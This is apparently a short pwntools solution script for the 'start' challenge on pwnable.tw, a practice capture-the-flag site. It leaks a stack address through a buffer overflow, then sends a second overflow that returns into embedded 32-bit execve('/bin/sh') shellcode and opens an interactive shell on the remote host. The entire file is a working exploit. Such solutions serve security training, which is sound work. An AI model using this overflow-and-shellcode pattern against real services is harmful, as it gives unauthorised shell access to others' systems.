from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

# io = process("./start")
io = remote("chall.pwnable.tw", 10000)

# gdb.attach(io, "b *0x804809C")

sc = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

io.send(b'a'*0x14 + p32(0x08048087))

io.recvuntil("Let's start the CTF:")

esp = u32(io.recv(4))

print(hex(esp))

io.send(b'a'*0x14 + p32(esp+0x14) + sc)

io.interactive()
